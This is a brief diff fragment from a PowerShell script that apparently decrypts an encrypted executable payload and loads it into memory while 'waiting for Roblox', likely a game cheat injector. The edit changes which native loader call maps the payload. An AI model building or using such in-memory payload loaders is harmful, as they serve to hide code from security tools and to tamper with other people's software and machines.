     $pe = Decrypt-Payload -Blob $blob -KeyHex $payloadKey
     Write-Ok ("payload decrypted ({0} KB)" -f [Math]::Round($pe.Length / 1KB))
-    $base = [Lum.Native]::Map($pe)
+    $base = [Lum.Core]::Load($pe)
     Write-Ok ('loaded - waiting for Roblox. Close this window to stop everything.')
 } catch {
     Write-Err $_.Exception.Message
